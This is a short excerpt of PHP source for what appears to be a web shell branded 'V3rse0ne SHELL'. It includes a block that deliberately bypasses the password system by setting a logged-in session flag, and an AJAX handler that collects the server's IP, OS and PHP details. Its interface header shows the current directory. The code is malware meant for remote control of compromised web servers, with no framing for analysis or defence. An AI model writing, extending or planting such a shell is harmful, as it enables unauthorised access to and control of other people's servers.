...
// Auto-login — skip password system entirely
$_SESSION['logged_in'] = true;
$_SESSION['login_time'] = time();

// CEK INFO VIA AJAX - INFO SEDERHANA (IP, OS, SERVER, PHP)
if(isset($_GET['ajax_info'])){
    $info = [];
...
<div class="header">
    <div class="header-info">
        <i class="fas fa-terminal"></i> V3rse0ne SHELL | <?=htmlspecialchars($current_dir)?>
    </div>
